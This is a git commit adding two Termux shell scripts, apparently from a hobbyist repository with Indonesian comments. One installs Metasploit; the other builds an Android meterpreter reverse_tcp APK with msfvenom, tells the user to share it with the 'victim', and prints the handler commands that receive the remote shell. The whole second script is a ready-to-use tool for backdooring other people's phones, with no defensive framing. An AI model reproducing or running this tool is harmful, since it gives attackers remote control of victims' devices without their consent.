326118b5dd1cd51fa0e144dbfc633d8f48392259
SamSilence <45084223+SamSilence@users.noreply.github.com>
2019-05-17 12:39:58 +0700

    Add files via upload

---
+++ install.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+#anak sd juga bisa buat
+
+
+pkg install unstable-repo -y
+pkg install metaspolit -y
+pkg install ruby -y
+gem install lolcat -y
+pkg install lolcat -y
+chmod +x mts.sh
+clear
+echo "TERINSTALL
+
+[•] tinggal jalankan msfconsole dengan
+[•] mengetik ./mts.sh
+
+" | lolcat
---
+++ mts.sh
@@ -0,0 +1,36 @@
+#!/bin/bash
+
+
+echo "
+METASPLOIT              _
+/ ___|| |__   ___  _ __| |_
+\___ \| '_ \ / _ \| '__| __|
+ ___) | | | | (_) | |  | |_
+|____/|_| |_|\___/|_|   \__|
+                    VERSION
+" | lolcat
+
+read -p "your IP: " ip
+read -p "your back door name: " nm
+msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=8080 -o /sdcard/$nm.apk
+
+echo "[•] apk berhasil dibuat, cek dipenyimpanan internal
+[•] bagikan aplikasi ke korban
+[•] jika sudah dipasang ketik y
+" | lolcat
+
+read -p "continue? [Y/n]: " y
+
+if [ $y = y ] || [ $y = Y ]
+then
+echo "
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost $ip
+set lport 8080
+run"
+
+echo "ketikan ini" | lolcat
+fi
+
